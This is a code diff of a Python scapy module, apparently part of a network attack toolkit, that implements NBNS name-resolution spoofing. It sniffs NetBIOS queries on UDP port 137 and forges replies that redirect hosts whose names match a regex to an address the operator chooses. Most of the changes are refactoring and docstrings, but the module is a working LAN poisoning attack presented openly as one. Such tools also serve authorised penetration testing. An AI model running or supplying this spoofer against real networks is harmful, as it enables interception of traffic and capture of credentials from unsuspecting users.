@@ -2,7 +2,8 @@ import re
 from threading import Thread
 from scapy.all import *
 from poison import Poison
-import util, config
+import util
+import config
 
 #
 # implements NBNS spoofing as seen in msf.
@@ -20,14 +21,16 @@ class NBNSSpoof(Poison):
 		self.dump = False
 		super(NBNSSpoof,self).__init__('NBNS Poison')
 
-	#
-	# callback for packets; match 
-	#
 	def handler(self,pkt):
+		"""Callback for packets"""
 		if pkt.haslayer(NBNSQueryRequest):
 			request = pkt[NBNSQueryRequest].getfieldval('QUESTION_NAME')
-			ret = self.regex_match.search(request)
-			if not ret.group(0) is None and pkt[Ether].dst != self.local_mac and pkt[IP].src != util.get_local_ip(config.get('iface')): 
+			ret = self.regex_match.search(request.lower())
+			if ret is None:
+				return
+
+			if not ret.group(0) is None and pkt[Ether].dst != self.local_mac \
+						and pkt[IP].src != util.get_local_ip(config.get('iface')): 
 				trans_id = pkt[NBNSQueryRequest].getfieldval('NAME_TRN_ID')
 				response = Ether(dst=pkt[Ether].src, src=self.local_mac)
 				response /= IP(dst=pkt[IP].src)/UDP(sport=137,dport=137)
@@ -37,19 +40,22 @@ class NBNSSpoof(Poison):
 				if self.dump: util.Msg('Spoofing \'%s\' from %s'%(request.strip(), pkt[IP].src))
 
 	def initialize(self):
+		"""Initialize spoofer"""
 		while True:
 			try:
 				util.Msg('Using interface [%s:%s]'%(config.get('iface'),self.local_mac))
 				tmp = raw_input('[+] Match request regex: ')
 				self.regex_match = re.compile(tmp)
 				self.redirect = raw_input('[+] Redirect matched requests to: ')
-				tmp = raw_input('[!] Match requests with \'%s\' and redirect to \'%s\'.  Is this correct? '%(self.regex_match.pattern, self.redirect))
+				tmp = raw_input('[!] Match requests with \'%s\' and redirect to \'%s\'.  Is this correct? '\
+										%(self.regex_match.pattern, self.redirect))
 				if 'n' in tmp.lower():
 					return
 				break
 			except KeyboardInterrupt:
 				return False
-			except:
+			except Exception, e:
+				print e
 				pass
 
 		print '[!] Starting NBNS spoofer...' 
@@ -58,24 +64,20 @@ class NBNSSpoof(Poison):
 		self.running = True
 		return True
 
-	#
-	# sniff thread; idk how i squeeze this performance out of all this
-	#
 	def sniff_thread(self):
+		"""Sniff packets"""
 		sniff(filter='udp and port 137', prn=self.handler, store=0, stopper=self.stop_call,
 												stopperTimeout=3)
 
-			
-	#
-	# check status of spoofer
-	#
 	def stop_call(self):
+		"""Stop callback"""
 		if self.running:
 			return False
 		util.debug('nbns spoofer shutdown')
 		return True
 
 	def view(self):
+		"""Dump packets"""
 		try:
 			while True:
 				self.dump = True
@@ -83,11 +85,13 @@ class NBNSSpoof(Poison):
 			self.dump = False
 			return
 
-	#
-	# callback shutdown
-	#
 	def shutdown(self):
+		"""Shutdown sniffer"""
 		util.Msg("Shutting down NBNS spoofer...")
 		if self.running:
 			self.running = False
 		return True
+
+	def session_view(self):
+		"""Override session viewer"""
+		return '%s -> %s'%(self.regex_match.pattern,self.redirect)
